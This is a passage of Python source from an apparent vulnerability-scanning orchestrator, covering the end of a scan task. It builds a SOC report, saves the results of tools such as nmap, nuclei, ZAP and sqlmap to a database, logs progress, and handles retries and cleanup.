                    target, risk_score, correlation_report, _soc_for_fallback,
                    reason="AI_ANALYSIS_ENABLED=false or no GEMINI_API_KEY",
                )
            else:
                ai_result = {"enabled": False,
                             "note": "No findings and AI disabled  --  set GEMINI_API_KEY to activate"}
                _add_log(db, scan_id, "[P5] AI Analysis: desactive, aucun finding")

        _update_scan(db, scan, current_phase="soc_output", progress=96)

        # a"EURa"EUR SOC Report final a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
        soc_report: Dict[str, Any] = {}
        try:
            soc_report = _build_soc_report(target, scan_id, risk_report, correlation_report, ctx, lab_mode=lab_mode)
            risk_level = soc_report.get("risk_level", "UNKNOWN")
            recs_count = len(soc_report.get("recommendations", []))
            top_count  = len(soc_report.get("top_findings", []))
            _add_log(db, scan_id,
                     f"[P5] SOC Report: Risk Level={risk_level} | "
                     f"{top_count} top findings | {recs_count} recommandations",
                     level="error" if risk_level in ("CRITICAL", "HIGH") else "info")
            for rec in soc_report.get("recommendations", [])[:3]:
                _add_log(db, scan_id, f"  -> {rec}", level="warning")
        except Exception as exc:
            soc_report = {"error": str(exc)}
            _add_log(db, scan_id, f"[P5] SOC report error: {exc}", level="error")
            logger.exception("SOC report build failed for %s", target)

        # a"EURa"EUR Persistance finale a"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EURa"EUR
        recon = ReconnaissanceResult(
            id=uuid.uuid4(),
            scan_id=uuid.UUID(scan_id),
            shodan_data=shodan_result,
            virustotal_data=vt_result,
            abuseipdb_data=abuse_result,
            nmap_data=nmap_result,
            nuclei_data=nuclei_result,
            zap_data=zap_result,
            risk_score=risk_score,
            abuseipdb_score=float(
                abuse_result.get("data", {}).get("abuse_confidence_score", 0)
            ),
            virustotal_score=float(
                vt_result.get("data", {}).get("malicious", 0)
                or max(
                    vt_result.get("data", {}).get("domain", {}).get("malicious", 0),
                    vt_result.get("data", {}).get("url",    {}).get("malicious", 0),
                )
            ),
            nuclei_score=float(nuclei_result.get("total", 0)),
            zap_score=float(zap_result.get("total", 0)),
            correlated_data=correlation_report,
            exploitability_score=risk_report.get("exploitability_score"),
            confidence_score=risk_report.get("confidence_score"),
            correlation_score=correlation_report.get("confidence_score"),
            risk_component_scores=risk_report.get("component_scores"),
            threat_intelligence_factor=risk_report.get("threat_intelligence_factor"),
            cve_severity_factor=risk_report.get("cve_severity_factor"),
            service_exposure_factor=risk_report.get("service_exposure_factor"),
            soc_report=soc_report,
            subfinder_data=subfinder_result,
            dalfox_data=dalfox_result,
            fp_reduction_data=fp_report if not fp_report.get("error") else None,
            fp_reduction_rate=fp_report.get("fp_reduction_rate") if not fp_report.get("error") else None,
            false_positive_count=fp_report.get("removed_total") if not fp_report.get("error") else None,
        )
        db.add(recon)

        _update_scan(
            db, scan,
            status=ScanStatus.completed,
            progress=100,
            risk_score=risk_score,
            correlated_data=correlation_report,
            soc_report=soc_report,
            current_phase="complete",
            subfinder_data=subfinder_result,
            dalfox_data=dalfox_result,
            fp_reduction_data=fp_report if not fp_report.get("error") else None,
            ffuf_data=ffuf_result,
            sqlmap_data=sqlmap_result,
            gitleaks_data=gitleaks_result,
            katana_data=katana_result,
            ai_analysis_data=ai_result if ai_result else None,
        )
        _publish(
            r, scan_id, "completed", 100,
            f"Scan completed  --  Risk: {soc_report.get('risk_level', 'N/A')} ({risk_score}/100)",
            {
                "risk_score":          risk_score,
                "risk_level":          soc_report.get("risk_level"),
                "exploitability":      risk_report.get("exploitability_score"),
                "confidence":          risk_report.get("confidence_score"),
                "correlated_findings": correlation_report.get("total_findings", 0),
            },
        )
        _add_log(db, scan_id,
                 f"[P5] [OK] Scan completed  --  {soc_report.get('executive_summary', '')}")
        _add_log(db, scan_id, "Phase 5/5 complete [OK]  --  Pipeline 5 phases termine avec succes")

        logger.info(
            "Scan %s completed (risk=%d, level=%s, findings=%d) for %s",
            scan_id, risk_score,
            soc_report.get("risk_level", "?"),
            correlation_report.get("total_findings", 0),
            target,
        )
        timing_summary = timer.summary()
        plog.info(
            f"Scan completed  --  risk={risk_score} level={soc_report.get('risk_level')} "
            f"total_elapsed={timing_summary['total_elapsed']}s "
            f"slowest={timing_summary.get('slowest_phase')}({timing_summary.get('slowest_duration')}s)",
            tool="orchestrator",
        )

        return {
            "scan_id":             scan_id,
            "status":              "completed",
            "risk_score":          risk_score,
            "risk_level":          soc_report.get("risk_level"),
            "correlated_findings": correlation_report.get("total_findings", 0),
            "timing":              timing_summary,
        }

    except Exception as exc:
        logger.exception("Unhandled error in run_scan for %s", scan_id)
        plog.error(f"Scan failed: {exc}", tool="orchestrator")
        try:
            if scan is not None:
                _update_scan(db, scan, status=ScanStatus.failed, error_message=str(exc))
                _publish(r, scan_id, "failed", scan.progress, f"Scan failed: {exc}")
                _add_log(db, scan_id, f"Scan failed: {exc}", level="error")
        except Exception:
            pass

        if isinstance(exc, (sync_redis.ConnectionError, sync_redis.TimeoutError, SAOperationalError)):
            retry_num = self.request.retries
            countdown = 30 * (2 ** retry_num)
            logger.warning("Retrying scan %s (attempt %d/3) in %ds", scan_id, retry_num + 1, countdown)
            raise self.retry(exc=exc, countdown=countdown)
        raise

    finally:
        if lock_key:
            try:
                r.delete(lock_key)
            except Exception:
                pass
        loop.close()
        r.close()
        if ctx is not None:
            ctx.close()
        db.close()
